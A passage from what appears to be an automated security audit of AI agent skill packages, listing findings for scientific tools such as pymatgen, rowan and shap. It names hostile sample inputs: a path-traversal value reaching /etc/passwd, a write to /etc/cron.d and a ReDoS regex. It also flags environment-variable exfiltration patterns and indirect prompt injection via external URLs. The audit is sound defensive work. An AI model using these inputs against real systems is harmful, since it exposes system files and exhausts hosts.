  > The skill instructs the agent to run 'pz login' and configures an external API URL via 'export PZ_API_URL=https://paperzilla.ai'. The 'pz login' command likely stores authentication tokens locally and all subsequent CLI commands transmit data to this external endpoint. The skill does not clarify what data is sent, how credentials are stored, or what the privacy implications are. Combined with commands that read project data, papers, and recommendations, there is a risk of sensitive research data being transmitted to an external service without explicit user awareness.
  > File: `SKILL.md`

While subprocess.run with a list (not shell=True) mitigates direct shell injection, unsanitized flag injection can still cause unintended behavior.
  > File: `scripts/phylogenetic_analysis.py:57`

A malicious user could supply paths like '../../../etc/passwd' or paths pointing to sensitive files, potentially causing the tool to read or overwrite unintended files.
  > File: `scripts/phylogenetic_analysis.py:100`
  > **Remediation:** Validate and sanitize all user-supplied file paths. Use Path.resolve() and check that resolved paths remain within expected working directories. Reject paths containing '..' components.

- **🔵 LOW** `LLM_RESOURCE_ABUSE` — Unbounded Resource Consumption via Bootstrap and Thread Parameters
  > The script accepts user-controlled bootstrap replicates and thread counts without upper bounds. A user could specify extremely large bootstrap values (e.g., --bootstrap 1000000) or excessive thread counts, causing significant CPU and memory exhaustion on the host system.
  > File: `scripts/phylogenetic_analysis.py:107`
  > **Remediation:** Add reasonable upper bounds for bootstrap replicates (e.g., max 10000) and thread counts (e.g., max os.cpu_count()). Validate these parameters before passing to subprocess calls.

  > The SKILL.md instructions reference 'C:\Users\eamon\Documents\Data\PrimeKG\kg.csv' (Windows path) in the Data access section, while the Python script uses '/mnt/c/Users/eamon/Documents/Data/PrimeKG/kg.csv' (WSL path). - **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Hardcoded Absolute Path Exposing Developer's Local Filesystem Structure
  > The skill hardcodes an absolute path referencing a specific developer's home directory: '/mnt/c/Users/eamon/Documents/Data/PrimeKG/kg.csv' and 'C:\Users\eamon\Documents\Data\PrimeKG\kg.csv'. This exposes the developer's username and local filesystem layout, and the skill will silently fail on any other system. More importantly, this path is not configurable, meaning the agent will attempt to access a hardcoded path on the user's machine that likely does not exist, potentially causing unexpected behavior or errors.
  > File: `scripts/query_primekg.py:7`
  > **Remediation:** Replace hardcoded paths with a configurable environment variable (e.g., os.environ.get('PRIMEKG_DATA_PATH')) or a relative path within the skill package. Document the required setup clearly in the skill README.

- **🟡 MEDIUM** `LLM_RESOURCE_ABUSE` — Repeated Full CSV Load on Every Function Call Causes Compute Exhaustion
  > The _load_kg() helper is called inside every public function (search_nodes, get_neighbors, find_paths, get_disease_context). Each call reads the entire 4-million-edge CSV (~hundreds of MB) from disk into memory with no caching, memoization, or singleton pattern. A workflow that calls multiple functions (e.g., get_disease_context which internally calls search_nodes then get_neighbors, each loading the full CSV) will load the multi-hundred-MB file 3+ times per query. This can exhaust available RAM and cause severe performance degradation or OOM crashes on the agent's host machine.
  > File: `scripts/query_primekg.py:10`
  > **Remediation:** Implement module-level caching using a global variable or functools.lru_cache to load the CSV only once per session. Consider using a proper graph database (e.g., Neo4j, DuckDB) for a 4M-edge dataset.

- **🔵 LOW** `LLM_COMMAND_INJECTION` — Unsanitized User Input Passed to pandas str.contains (Regex Injection)
  > The search_nodes function passes the user-supplied name_query string directly to pandas str.contains(), which interprets the input as a regular expression by default. A malicious or malformed regex (e.g., '(a+)+' or an extremely complex pattern) could cause catastrophic backtracking, consuming excessive CPU. While not a direct code execution risk, it represents an injection of untrusted regex patterns into the query engine.
  > File: `scripts/query_primekg.py:47`
  > **Remediation:** Use regex=False parameter to treat the query as a literal string: nodes['name'].str.contains(name_query, case=False, na=False, regex=False). If regex support is needed, validate and sanitize the input first with re.escape().

### protocolsio-integration — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Access Token Handling Risk - Tokens Passed as Plaintext in Instructions
  > The skill instructions repeatedly reference using access tokens (CLIENT_ACCESS_TOKEN, OAUTH_ACCESS_TOKEN) and include example code with placeholder 'YOUR_ACCESS_TOKEN' strings. The instructions direct the agent to include tokens in Authorization headers for all API calls. If a user provides a real token, the agent will use it in network requests to protocols.io. While the skill itself does not exfiltrate tokens, the pattern of handling sensitive credentials in agent context increases the risk of token exposure through conversation logs, context windows, or misuse.
  > File: `SKILL.md`
  > **Remediation:** Instruct users to store tokens in environment variables rather than passing them directly. Add explicit guidance that tokens should never be pasted into the conversation. Reference secure token storage patterns.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Missing License Information
  > The skill manifest declares 'Unknown' for the license field. While not a direct security threat, this lack of provenance information makes it difficult to assess the trustworthiness and legal standing of the skill package.
  > File: `SKILL.md`
  > **Remediation:** Specify a valid open source license (e.g., MIT, Apache 2.0) in the manifest to establish clear provenance.

- **🔵 LOW** `LLM_RESOURCE_ABUSE` — Unbounded Retry Logic Could Cause Resource Exhaustion
  > The error handling example in SKILL.md implements retry logic with exponential backoff but uses a fixed max_retries=3 with time.sleep() calls. While bounded, the pattern could be extended or misused. More importantly, the retry logic for 429 (rate limit) errors uses the server-provided Retry-After header value with no upper bound cap, meaning a malicious or misconfigured server could return a very large Retry-After value causing the agent to sleep indefinitely.
  > File: `SKILL.md`
  > **Remediation:** Cap the maximum sleep duration from Retry-After headers (e.g., max 300 seconds). Add a total timeout for the entire retry sequence to prevent indefinite blocking.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing Compatibility and Allowed-Tools Metadata
  > The skill does not specify 'compatibility' or 'allowed-tools' fields in the YAML manifest. While these are optional fields, their absence means there are no declared constraints on which tools the agent may use when executing this skill, potentially allowing broader tool access than necessary.
  > File: `SKILL.md`
  > **Remediation:** Add explicit 'allowed-tools' and 'compatibility' fields to the manifest to constrain the skill's tool access to only what is needed (e.g., Bash for HTTP requests).

- **🟡 MEDIUM** `MDBLOCK_PYTHON_HTTP_POST` — Python code block sends HTTP POST request
  > Code block in SKILL.md at line 283 contains potentially dangerous Python code.
  > File: `SKILL.md:283`
  > **Remediation:** Review the code block for security implications.

- **🟡 MEDIUM** `MDBLOCK_PYTHON_HTTP_POST` — Python code block sends HTTP POST request
  > Code block in SKILL.md at line 310 contains potentially dangerous Python code.
  > File: `SKILL.md:310`
  > **Remediation:** Review the code block for security implications.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — OAuth Client Secret Exposure Risk
  > The authentication reference files describe an OAuth flow that requires a 'client_secret' parameter. The instructions do not include adequate warnings about protecting this secret, and the example flows show it being passed as a parameter. If a user follows these instructions and provides their client_secret in conversation, it could be exposed in logs or context.
  > File: `references/authentication.md`
  > **Remediation:** Add explicit warnings that client_secret must never be shared in conversation or stored in code. Recommend environment variable storage and reference secure credential management practices.

### pufferlib — 🟡 MEDIUM

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing allowed-tools Manifest Field
  > The SKILL.md manifest does not specify the allowed-tools field. While this is optional per the spec, the skill executes Python scripts (train_template.py, env_template.py) that perform file system operations (os.makedirs, file writes for checkpoints), network operations (WandB/Neptune logging), and GPU access. Declaring allowed-tools would improve transparency about the skill's capabilities.
  > File: `SKILL.md`
  > **Remediation:** Add allowed-tools: [Python, Bash] to the YAML frontmatter to explicitly declare the tools this skill uses.

- **🔵 LOW** `LLM_SUPPLY_CHAIN_ATTACK` — No Dependency Version Pinning in Installation Instructions
  > The installation instruction uses 'uv pip install pufferlib' without pinning a specific version. This means the skill will always install the latest version of pufferlib, which could introduce breaking changes or, in a supply chain attack scenario, a compromised version. The skill also imports several optional dependencies (wandb, neptune) without version constraints.
  > File: `SKILL.md`
  > **Remediation:** Pin the dependency to a specific version: 'uv pip install pufferlib==X.Y.Z'. Consider adding a requirements.txt with pinned versions for all dependencies including torch, gymnasium, pettingzoo, wandb, and neptune-client.

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Neptune API Token Passed via Command-Line Argument
  > The training script accepts a Neptune API token via the --neptune-token command-line argument and passes it directly to NeptuneLogger. While this is a common pattern, passing secrets as CLI arguments exposes them in process listings (ps aux), shell history, and system logs. The token is also stored in the parsed args namespace and passed via vars(args) to WandbLogger config, potentially logging the token to experiment tracking systems.
  > File: `scripts/train_template.py:97`
  > **Remediation:** Use environment variables (os.environ.get('NEPTUNE_API_TOKEN')) instead of CLI arguments for secrets. Exclude sensitive fields from config logging: config={k:v for k,v in vars(args).items() if 'token' not in k.lower()}.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Checkpoint Directory Created Without Path Validation
  > The training script creates a checkpoint directory using os.makedirs with a user-supplied path (args.checkpoint_dir, default 'checkpoints'). While the default is benign, if a user passes an absolute path like /etc/cron.d or a path traversal like ../../sensitive_dir, the script will create directories there. Checkpoint files are also written to this user-controlled path.
  > File: `scripts/train_template.py:185`
  > **Remediation:** Validate that args.checkpoint_dir is a relative path or within an expected base directory. Use os.path.abspath and check it starts with an allowed prefix before creating directories or writing files.

### pymatgen — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_SUPPLY_CHAIN_ATTACK` — Unpinned Package Dependencies
  > The SKILL.md instructions recommend installing pymatgen and mp-api without version pins using 'uv pip install pymatgen' and 'uv pip install mp-api'. Unpinned dependencies are vulnerable to supply chain attacks where a malicious version of a package could be published and automatically installed. Given that pymatgen is a large library with extensive system access capabilities (file I/O, network calls, subprocess execution), a compromised version could exfiltrate materials data, API keys, or other sensitive information.
  > File: `SKILL.md`
  > **Remediation:** Pin all dependencies to specific versions: 'uv pip install pymatgen==2024.x.x mp-api==0.x.x'. Consider using a requirements.txt or pyproject.toml with locked versions and hash verification.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — API Key Documented in Plaintext Examples
  > The SKILL.md and references/materials_project_api.md both contain examples showing the API key being passed as a string literal: MPRester("your_api_key_here"). While these are placeholder examples, they normalize the pattern of hardcoding API keys in code. Additionally, the materials_project_api.md reference shows an alternative pattern of explicitly passing the API key as a positional argument, which could lead users to hardcode real keys.
  > File: `SKILL.md`
  > **Remediation:** Remove examples showing explicit API key passing as string literals. Only document the environment variable approach. Add a warning note that API keys should never be hardcoded in scripts.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing Compatibility and Allowed-Tools Metadata
  > The skill manifest does not specify 'compatibility' or 'allowed-tools' fields. The scripts use Python execution, file system access (read and write), and network calls to external APIs. Without declared allowed-tools, the agent has no declared constraints on what tools it can use. This is informational per the spec (optional fields) but reduces transparency about the skill's actual capabilities.
  > File: `SKILL.md`
  > **Remediation:** Add 'allowed-tools: [Python, Bash]' and 'compatibility' fields to the YAML frontmatter to clearly document the skill's tool requirements and intended execution environments.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — API Key Accessed via Environment Variable with Network Calls
  > The phase_diagram_generator.py script reads the MP_API_KEY environment variable and passes it directly to MPRester for network calls to the Materials Project API. While this is a legitimate and documented pattern for this library, the static analyzer flagged it as a potential env var exfiltration chain. In context, this is expected behavior for the Materials Project API integration. The risk is low because the key is only used for the intended Materials Project API endpoint, not exfiltrated to a third-party server. However, there is no validation that the API endpoint being called is the legitimate Materials Project server, and the key is passed as a positional argument which could be logged.
  > File: `scripts/phase_diagram_generator.py:57`
  > **Remediation:** This is expected behavior for Materials Project integration. Ensure the mp-api package is pinned to a specific version to prevent supply chain attacks that could redirect the API key. Consider using MPRester() without explicit key passing (it reads the env var internally) to avoid key appearing in call stacks.

- **🟡 MEDIUM** `BEHAVIOR_ENV_VAR_HARVESTING` — Environment variable harvesting detected
  > Script iterates through environment variables in skills/pymatgen/scripts/phase_diagram_generator.py
  > File: `skills/pymatgen/scripts/phase_diagram_generator.py`
  > **Remediation:** Remove environment variable collection unless explicitly required and documented

### rowan — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Referenced Script Files Not Found - Potential Missing Security Controls
  > The SKILL.md references two Python files (rdkit.py and rowan.py) that were not found in the skill package. The static pre-scan identified cross-file exfiltration chains across 6 files and environment variable access with network calls. The absence of these referenced files means their actual behavior cannot be audited. If these files are loaded at runtime from an external source or are present in a deployment not captured here, they could contain data exfiltration logic (environment variable harvesting + network calls) as flagged by the static analyzer.
  > File: `SKILL.md`
  > **Remediation:** Ensure all referenced script files are included in the skill package for auditability. Audit rdkit.py and rowan.py for environment variable access patterns combined with network calls. Verify that ROWAN_API_KEY and other environment variables are only accessed for their intended purpose and not transmitted to unexpected endpoints. Pin the rowan-python package to a specific version to prevent supply chain attacks.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — API Key Exposure in Inline Code Examples
  > The SKILL.md instruction body contains multiple inline code examples that show the API key being set directly in Python code (e.g., `rowan.api_key = "your_api_key_here"`). While these are placeholder values, the pattern encourages users to hardcode API keys in scripts rather than using environment variables exclusively. The skill does mention the environment variable approach as 'recommended' but the inline assignment pattern is repeated throughout the document and in the Quick Start section, normalizing insecure credential handling.
  > File: `SKILL.md`
  > **Remediation:** Remove or de-emphasize inline API key assignment patterns. Consistently promote only the environment variable approach (ROWAN_API_KEY). Add explicit warnings against hardcoding API keys in scripts that may be committed to version control.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Webhook Secret Printed to Console in Examples
  > Multiple code examples in SKILL.md print webhook secrets directly to the console output (e.g., `print(f"Secret key: {secret.secret}")`). This pattern, if followed by users, could expose webhook secrets in logs, terminal history, CI/CD output, or shared screen sessions.
  > File: `SKILL.md`
  > **Remediation:** Remove print statements that output secrets in example code. Replace with guidance to store secrets securely (e.g., environment variables, secret managers) rather than printing them.

- **🔵 LOW** `LLM_RESOURCE_ABUSE` — Unbounded Batch Submission Without Rate Limiting or Credit Guards
  > The batch submission patterns in SKILL.md submit workflows in a tight loop without any rate limiting, credit checks, or upper bounds on the number of submissions. A user following these patterns with a large compound list could inadvertently exhaust their Rowan credits or trigger API rate limits. The skill does not instruct the agent to warn users about credit consumption before submitting large batches.
  > File: `SKILL.md`
  > **Remediation:** Add guidance to check available credits before large batch submissions using `rowan.whoami().credits_available_string`. Include recommended batch size limits and suggest chunking large submissions. Instruct the agent to warn users about estimated credit costs before submitting batches above a threshold.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Broad Trigger Keywords May Cause Over-Activation
  > The skill's trigger-keywords metadata includes very broad terms such as 'chemistry workflow', 'drug discovery', 'SMILES', and 'protein structure'. These are common terms in scientific computing contexts and could cause the skill to activate in situations where it is not the most appropriate tool, potentially leading to unnecessary API credit consumption or unexpected behavior when users are working with other chemistry tools.
  > File: `SKILL.md`
  > **Remediation:** Narrow trigger keywords to more specific Rowan-platform terms (e.g., 'rowan workflow', 'rowan API', 'rowan docking') to reduce false-positive activations and unintended credit consumption.

### scikit-survival — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Suspicious Static Analysis Findings: Environment Variable Access with Network Calls
  > The pre-scan static analysis flagged BEHAVIOR_ENV_VAR_EXFILTRATION and BEHAVIOR_CROSSFILE_EXFILTRATION_CHAIN across 3 files, and BEHAVIOR_CROSSFILE_ENV_VAR_EXFILTRATION across 3 files. The skill manifest lists 3 Python files in the file inventory (python: 3) but the skill submission shows 'No script files found' and references to 'sklearn.py' and 'sksurv.py' as not found. This discrepancy suggests there may be hidden or unsubmitted Python scripts that contain environment variable access combined with network calls - a classic data exfiltration pattern. The static analyzer detected these patterns but the files were not provided for review.
  > **Remediation:** Audit all Python files in the skill package (sklearn.py, sksurv.py, and any others) for environment variable access (os.environ, os.getenv) combined with network calls (requests, urllib, http.client). Remove any code that reads environment variables and transmits them externally. Ensure all Python files are reviewed before deployment.

- **🔵 LOW** `LLM_PROMPT_INJECTION` — External URLs Referenced in Instructions Without Validation Warning
  > The SKILL.md instructions reference external URLs (https://scikit-survival.readthedocs.io/ and https://github.com/sebp/scikit-survival) as 'Additional Resources.' If the agent is instructed to fetch content from these URLs, any malicious content hosted there could constitute indirect prompt injection. While these are legitimate well-known URLs, the skill does not explicitly warn against fetching and executing instructions from external sources.
  > File: `SKILL.md`
  > **Remediation:** Add explicit guidance that the agent should not fetch and execute instructions from external URLs. Mark these as reference links for human users only, not for automated fetching by the agent.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Over-Broad Capability Description in Manifest
  > The skill description is very broad, claiming to handle 'any survival analysis workflow with the scikit-survival library.' While this is a documentation/reference skill, the description could trigger the skill for a wide range of queries beyond its actual scope. The description lists many specific trigger keywords (Cox models, Random Survival Forests, Gradient Boosting, Survival SVMs, concordance index, Brier score, competing risks) which could cause over-activation.
  > File: `SKILL.md`
  > **Remediation:** Narrow the description to more precisely describe the skill's actual function (providing reference documentation and code examples for scikit-survival). Avoid listing exhaustive trigger keywords in the description field.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Missing allowed-tools and compatibility Metadata
  > The skill manifest does not specify 'allowed-tools' or 'compatibility' fields. While these are optional per the spec, their absence means there are no declared restrictions on what tools the agent can use when executing this skill. Given the skill references Python code examples and external URLs, declaring allowed tools would improve security posture.
  > File: `SKILL.md`
  > **Remediation:** Add 'allowed-tools' to restrict the skill to only the tools it needs (e.g., Read for loading reference files). Add 'compatibility' to document supported environments.

### shap — 🟡 MEDIUM

- **🟡 MEDIUM** `LLM_DATA_EXFILTRATION` — Static Analyzer Flagged Environment Variable Exfiltration and Cross-File Exfiltration Chain
  > The pre-scan static analyzer reported three significant behavioral findings: BEHAVIOR_ENV_VAR_EXFILTRATION (environment variable access with network calls detected), BEHAVIOR_CROSSFILE_EXFILTRATION_CHAIN (cross-file exfiltration chain across 3 files), and BEHAVIOR_CROSSFILE_ENV_VAR_EXFILTRATION (cross-file env var exfiltration across 3 files). The file inventory indicates 3 Python files exist in the package, but their content was not provided for analysis. These static findings suggest that Python scripts in the skill package may be reading environment variables (potentially containing credentials, API keys, or sensitive configuration) and transmitting them via network calls. The cross-file chain pattern suggests coordinated data collection and exfiltration across multiple scripts. This is a significant concern that warrants immediate investigation of the Python files.
  > File: `SKILL.md`

Remove any code that reads environment variables and transmits them externally. If legitimate network calls are needed, document them explicitly in the manifest and restrict to known safe endpoints.

- **🔵 LOW** `LLM_DATA_EXFILTRATION` — Missing allowed-tools Declaration
  > The SKILL.md manifest does not declare an 'allowed-tools' field. While this field is optional per the agent skills spec, its absence means there are no declared restrictions on what tools the agent can use when executing this skill. The skill instructs the agent to use the Read tool to load reference files, and the static analyzer flagged potential environment variable exfiltration and cross-file exfiltration chains in associated Python files (though no script files were found in the provided content). The absence of tool restrictions is a low-severity informational finding.
  > File: `SKILL.md`
  > **Remediation:** Consider adding 'allowed-tools: [Read, Python]' or appropriate restrictions to limit the agent's tool usage to what is necessary for this skill.

- **🔵 LOW** `LLM_SKILL_DISCOVERY_ABUSE` — Over-Broad Capability Description in Manifest

While this is largely accurate for the SHAP library, the description is designed to maximize activation across a wide range of ML-related queries. This is a minor concern as the actual skill content matches the described capabilities.
